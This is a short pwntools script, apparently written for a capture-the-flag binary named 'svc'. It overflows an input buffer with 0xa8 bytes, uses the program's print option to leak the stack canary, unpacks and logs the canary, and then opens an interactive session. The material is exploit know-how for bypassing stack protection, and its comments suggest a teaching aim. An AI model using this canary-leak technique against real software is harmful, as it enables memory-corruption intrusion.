#Import pwntools
from pwn import *

#Establish the target process, and attack gdb
target = process("./svc")
#gdb.attach(target)

#Specify that the menu option to scan in data into memory
print target.recvuntil(">>")
target.sendline('1')
print target.recvuntil(">>")

#Send the payload, which will allow us to leak the canary
leak_payload = "0"*0xa8
target.sendline(leak_payload)
print target.recvuntil(">>")

#Select the second option, to print out our input and leak the canary
target.sendline('2')
print target.recvuntil("[*]PLEASE TREAT HIM WELL.....")
print target.recvline()
print target.recvline()
print target.recvline()

#Scan in, parse out, unpack, and print the stack canary
leak = target.recvline()
print len(leak)
canary = u64("\x00" + leak[0:7])
log.info("The Stack Canary is: " + hex(canary))

#drop to an interactive shell
target.interactive()

